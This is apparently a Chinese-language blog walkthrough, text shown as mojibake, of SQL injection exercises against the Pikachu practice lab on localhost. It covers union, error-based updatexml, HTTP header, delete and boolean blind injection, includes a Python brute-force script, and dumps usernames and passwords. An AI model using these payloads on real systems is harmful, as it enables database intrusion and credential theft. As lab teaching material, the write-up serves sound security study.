<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#39; union select database(),version()#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201153407287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥æ•°æ®åº“ä¸­çš„è¡¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161144361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥userè¡¨ä¸­çš„å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;user&#39;#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161321999.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">æŸ¥å­—æ®µå€¼</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#39; union select group_concat(username),group_concat(password) from users#</span><br><span class="line">a&#39; union select group_concat(username),group_concat(password) from pikachu.users#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161641616.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æœç´¢å‹æ³¨å…¥"><a href="#æœç´¢å‹æ³¨å…¥" class="headerlink" title="æœç´¢å‹æ³¨å…¥"></a>æœç´¢å‹æ³¨å…¥</h2><p><img src="https://img-blog.csdnimg.cn/20210201161750828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">çˆ†å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#39; order by 3#</span><br><span class="line">a&#39; order by 4#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161959799.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥å‘ç°å­—æ®µä¸º3<br>çœ‹ä¸€ä¸‹æ˜¾ç¤ºä½</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#39; union select 1,2,3#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201162118452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ¥ç€å°±æ˜¯ç±»ä¼¼ä¹‹å‰çš„æ“ä½œ<br>ä¾æ¬¡æŸ¥æ•°æ®åº“åï¼Œè¡¨åï¼Œå­—æ®µåï¼Œå­—æ®µå€¼å°±è¡Œäº†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a&#39; union select 1,database(),version()#</span><br><span class="line"></span><br><span class="line">a&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()#</span><br><span class="line"></span><br><span class="line">a&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line"></span><br><span class="line">a&#39; union select group_concat(id),group_concat(username),group_concat(password) from users#</span><br></pre></td></tr></table></figure>



<h2 id="xxå‹æ³¨å…¥"><a href="#xxå‹æ³¨å…¥" class="headerlink" title="xxå‹æ³¨å…¥"></a>xxå‹æ³¨å…¥</h2><p><del>å°è¯•ç”¨å•å¼•å·é—­åˆï¼Œå‘ç°ä¸è¡Œï¼Œè¯•ä¸€è¯•åŒå¼•å·ï¼Œè¿˜æ˜¯ä¸è¡Œï¼ŒWTF??</del><br>å°è¯•ç”¨â€™)é—­åˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;) or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201162833211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ¥ç€é‡å¤å‰è¾¹çš„æ“ä½œä¾æ¬¡æŸ¥è¯¢å°±è¡Œäº†ï¼Œæ³¨æ„é—­åˆæ–¹å¼æ˜¯ç”¨å•å¼•å·åŠ ä¸Šå°æ‹¬å·</p>
<p>æˆ‘è¿™ç›´æ¥çˆ†usernameå’Œpasswordäº†<br><img src="https://img-blog.csdnimg.cn/20210201163135634.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="insert-updataæ³¨å…¥"><a href="#insert-updataæ³¨å…¥" class="headerlink" title="insert/updataæ³¨å…¥"></a>insert/updataæ³¨å…¥</h2><p>æ’å…¥å’Œæ›´æ–°æ—¶çš„æ³¨å…¥å°±éœ€è¦ç”¨burp suiteæ¥æŠ“åŒ…äº†<br>è¿™é‡Œä½¿ç”¨æŠ¥é”™æ³¨å…¥</p>
<h3 id="å¼•å…¥updatexmlå‡½æ•°"><a href="#å¼•å…¥updatexmlå‡½æ•°" class="headerlink" title="å¼•å…¥updatexmlå‡½æ•°"></a>å¼•å…¥updatexmlå‡½æ•°</h3><h4 id="å‡½æ•°è§£é‡Šï¼š"><a href="#å‡½æ•°è§£é‡Šï¼š" class="headerlink" title="å‡½æ•°è§£é‡Šï¼š"></a>å‡½æ•°è§£é‡Šï¼š</h4><p>UPDATEXML (XML_document, XPath_string, new_value);<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®<br>ä½œç”¨ï¼šæ­¤å‡½æ•°ç”¨æ¥æ›´æ–°é€‰å®šXMLç‰‡æ®µçš„å†…å®¹ï¼Œå°†XMLæ ‡è®°çš„ç»™å®šç‰‡æ®µçš„å•ä¸ªéƒ¨åˆ†æ›¿æ¢ä¸º <em>xml_target</em> æ–°çš„XMLç‰‡æ®µ <em>new_xml</em> ï¼Œç„¶åè¿”å›æ›´       æ”¹çš„XMLã€‚<em>xml_target</em>æ›¿æ¢çš„éƒ¨åˆ† ä¸<em>xpath_expr</em> ç”¨æˆ·æä¾›çš„XPathè¡¨è¾¾å¼åŒ¹é…ã€‚å¦‚æœæœª<em>xpath_expr</em>æ‰¾åˆ°è¡¨è¾¾å¼åŒ¹é… ï¼Œæˆ–è€…æ‰¾åˆ°å¤šä¸ªåŒ¹é…é¡¹ï¼Œåˆ™è¯¥å‡½æ•°è¿”å›åŸå§‹ <em>xml_target</em>XMLç‰‡æ®µã€‚</p>
<h4 id="æŠ¥é”™åŸç†"><a href="#æŠ¥é”™åŸç†" class="headerlink" title="æŠ¥é”™åŸç†"></a>æŠ¥é”™åŸç†</h4><p>è¿™é‡Œå’Œextractvalueå‡½æ•°ä¸€æ ·ï¼Œå½“Xpathè·¯å¾„è¯­æ³•é”™è¯¯æ—¶ï¼Œå°±ä¼šæŠ¥é”™ï¼ŒæŠ¥é”™å†…å®¹å«æœ‰é”™è¯¯çš„è·¯å¾„å†…å®¹ã€‚</p>
<h4 id="çº¦æŸæ¡ä»¶"><a href="#çº¦æŸæ¡ä»¶" class="headerlink" title="çº¦æŸæ¡ä»¶"></a>çº¦æŸæ¡ä»¶</h4><p> è¾“å‡ºå­—ç¬¦é•¿åº¦é™åˆ¶ä¸º32ä¸ªå­—ç¬¦</p>
<h4 id="æ³¨å…¥è¯­å¥"><a href="#æ³¨å…¥è¯­å¥" class="headerlink" title="æ³¨å…¥è¯­å¥"></a>æ³¨å…¥è¯­å¥</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(ä»£ç ),<span class="number">0x7e</span>),<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<h4 id="å®æ“"><a href="#å®æ“" class="headerlink" title="å®æ“"></a>å®æ“</h4><p>ç”¨bpæŠ“åŒ…</p>
<p>çˆ†æ•°æ®åº“å</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,database()),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201163855544.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">çˆ†è¡¨å</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021020212182937.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">å‘ç°æ˜¾ç¤ºä¸å®Œå…¨ï¼Œå‘ƒï¼Œè¶…å‡ºé•¿åº¦äº†<br>å°è¯•ç”¨leftï¼Œmidï¼Œrightæ¥è¿›è¡Œåˆ†æ®µæ˜¾ç¤ºï¼Œå°†å¾—åˆ°çš„ä¿¡æ¯è¿›è¡Œæ‹¼æ¥</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,left((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,mid((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,right((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202122232643.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/2021020212231394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/20210202122335881.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">åˆ†æˆä¸‰æ®µæ˜¾ç¤ºå°±å¯ä»¥çœ‹åˆ°å…¨éƒ¨å†…å®¹äº†</p>
<p>çˆ†å­—æ®µ</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,right((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202122514314.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/20210202122547898.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/20210202122631148.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">æ¥ä¸‹æ¥çˆ†æ•°æ®</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,(select group_concat(username) from users),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,left((select group_concat(password) from users),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202122755777.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/20210202123018270.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="deleteæ³¨å…¥"><a href="#deleteæ³¨å…¥" class="headerlink" title="deleteæ³¨å…¥"></a>deleteæ³¨å…¥</h2><p><img src="https://img-blog.csdnimg.cn/20210202123224348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç‚¹å‡»åˆ é™¤å¹¶æŠ“åŒ…çœ‹çœ‹<br><img src="https://img-blog.csdnimg.cn/2021020212370529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>åœ¨idå¤„è¿›è¡ŒæŠ¥é”™æ³¨å…¥</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">56</span><span class="operator">%</span><span class="number">20</span><span class="keyword">or</span><span class="operator">%</span><span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database()),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202123943418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">æ¥ä¸‹æ¥å°±å’Œä¸Šè¾¹å¤§åŒå°å¼‚äº†ï¼Œå°±ä¸å¤šå†™äº†</p>
<h2 id="http-headeræ³¨å…¥"><a href="#http-headeræ³¨å…¥" class="headerlink" title="http headeræ³¨å…¥"></a>http headeræ³¨å…¥</h2><p><a href="http://t0mrvvi1b3t.top/2021/04/29/http/">å…³äºhttpå¤´</a></p>
<h3 id="åœ¨User-Agentå¤„æ³¨å…¥"><a href="#åœ¨User-Agentå¤„æ³¨å…¥" class="headerlink" title="åœ¨User-Agentå¤„æ³¨å…¥"></a>åœ¨User-Agentå¤„æ³¨å…¥</h3><p>å…ˆéšä¾¿ç™»é™†ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/20210202135551902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/20210202135656799.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20210202135734904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">çˆ†æ•°æ®åº“</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="string">&#x27; or updatexml(1,concat(0x7e,database ()),0) or &#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202135818376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">æ¥ä¸‹æ¥å°±å’Œä¹‹å‰çš„å·®ä¸å¤šä¸€æ ·äº†ï¼Œè‡ªå·±æ“ä½œå°±è¡Œäº†</p>
<h3 id="åœ¨Cookieå¤„æ³¨å…¥"><a href="#åœ¨Cookieå¤„æ³¨å…¥" class="headerlink" title="åœ¨Cookieå¤„æ³¨å…¥"></a>åœ¨Cookieå¤„æ³¨å…¥</h3><p>è¿˜æ˜¯ä¸€æ ·çš„æ“ä½œå°†ç¬¬äºŒä¸ªåŒ…å‘é€åˆ°repeater<br><img src="https://img-blog.csdnimg.cn/20210202140258556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ„é€ è¯­å¥ï¼š<span class="string">&#x27;and updatexml (1,concat(0x7e,database()),0)#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202140353275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">è¿™æ ·ä¹Ÿå¯ä»¥çˆ†å‡ºæ•°æ®åº“å</p>
<h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><p>è¯­å¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#39; and ascii(substr(database(),1,1))&#x3D;112#</span><br></pre></td></tr></table></figure>

<p>æœ‰å…³å‡½æ•°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">length()å‡½æ•°çš„ä½œç”¨æ˜¯è¿”å›å­—ç¬¦ä¸²strçš„é•¿åº¦ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚ä¸€ä¸ªå¤šå­—èŠ‚å­—ç¬¦ç®—ä½œå¤šå­—èŠ‚ã€‚è¿™æ„å‘³ç€ï¼Œå¯¹äºåŒ…å«å››ä¸ªä¸¤å­—èŠ‚å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œlength() è¿”å›8,  è€Œ char_length() è¿”å› 4</span><br><span class="line"></span><br><span class="line">length(&#39;text&#39;)è¿”å›å€¼ä¸º4</span><br><span class="line"></span><br><span class="line">substr()å‡½æ•°ä»ç‰¹å®šä½ç½®å¼€å§‹çš„å­—ç¬¦ä¸²è¿”å›ä¸€ä¸ªç»™å®šé•¿åº¦çš„å­å­—ç¬¦ä¸²</span><br><span class="line">substr()å‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œç”¨æ³•ä¸ºï¼šsubstr(str,pos,len)</span><br><span class="line">strå‚æ•°ä»£è¡¨å¾…æˆªå–çš„å­—ç¬¦ä¸²</span><br><span class="line">poså‚æ•°ä»£è¡¨ä»ä»€ä¹ˆä½ç½®å¼€å§‹æˆªå–</span><br><span class="line">lenå‚æ•°è¡¨ç¤ºå­—ç¬¦ä¸²æˆªå–çš„é•¿åº¦</span><br><span class="line"></span><br><span class="line">ascii()å‡½æ•°å¯ä»¥è¾“å‡ºæŸä¸ªå­—ç¬¦çš„asciiç å€¼ï¼Œasciiç å…±127ä¸ªï¼Œæ­¤å¤„æ³¨æ„asciiå‡½æ•°å¤„ç†å•ä¸ªå­—ç¬¦ï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²åˆ™ä¼šå¤„ç†ç¬¬ä¸€ä¸ªå­—ç¬¦</span><br></pre></td></tr></table></figure>

<p>åŸç†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ— æ³•ä½¿ç”¨unionæ¥ç›´æ¥æŸ¥è¯¢æ—¶ï¼Œéœ€è¦ç”¨åˆ°å…³é”®å­—andï¼Œåªæœ‰andå‰åçš„æ¡ä»¶éƒ½ä¸ºçœŸçš„æ—¶å€™ï¼Œæ•°æ®åº“æ‰ä¼šè¾“å‡ºç»“æœã€‚ å°†è¿”å›å­—ç¬¦ä¸²çš„asciiä¸æ³¨å…¥è¯­å¥çš„asciiè¿›è¡Œæ¯”è¾ƒï¼Œç›¸ç­‰æ—¶æ‰ä¼šè¿”å›æ­£å¸¸çš„é¡µé¢ï¼Œåˆ©ç”¨è¿™ä¸ªè¿›è¡Œçˆ†ç ´å³å¯</span><br></pre></td></tr></table></figure>

<p>å¯ä½¿ç”¨bpè¿›è¡Œçˆ†ç ´ä¹Ÿå¯å†™pythonè„šæœ¬</p>
<p><del>ç»è¿‡å‡ ä¸ªå°æ—¶çš„å¥‹æˆ˜ï¼Œç»ˆäºæ•´å®Œäº†pythonè„šæœ¬ hahahah</del></p>
<p>çˆ†ç ´æ•°æ®åº“çš„pythonè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1=<span class="string">&quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=kobe%s&amp;submit=æŸ¥è¯¢&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=kobe&amp;submit=æŸ¥è¯¢&quot;</span></span><br><span class="line">payload=<span class="string">&quot;%27+and+ascii%28substr%28database%28%29%2C&#123;0&#125;%2C1%29%29%3D&#123;1&#125;%23&quot;</span></span><br><span class="line">database=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Start to retrive the database&quot;</span>)</span><br><span class="line">b=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        p=payload.<span class="built_in">format</span>(i,j)</span><br><span class="line">        url=url1 % p</span><br><span class="line">        r=((requests.get(url)).text).find(<span class="string">&#x27;pikachu.com&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> r==<span class="number">31550</span>:</span><br><span class="line">        	b=j</span><br><span class="line">    database+=<span class="built_in">chr</span>(b)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the database is :%s&quot;</span> % database)</span><br></pre></td></tr></table></figure>



<h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>éƒ½ä¸ºç›²æ³¨ï¼Œåˆ©ç”¨sleepå‡½æ•°è®¾å®šä¸€ä¸ªæ—¶é•¿ï¼Œé€šè¿‡é¡µé¢çš„ååº”æ—¶é—´æ¥åˆ¤æ–­æ³¨å…¥è¯­å¥çš„asciiä¸å¯¹åº”å­—ç¬¦æ˜¯å¦ç›¸ç­‰</p>
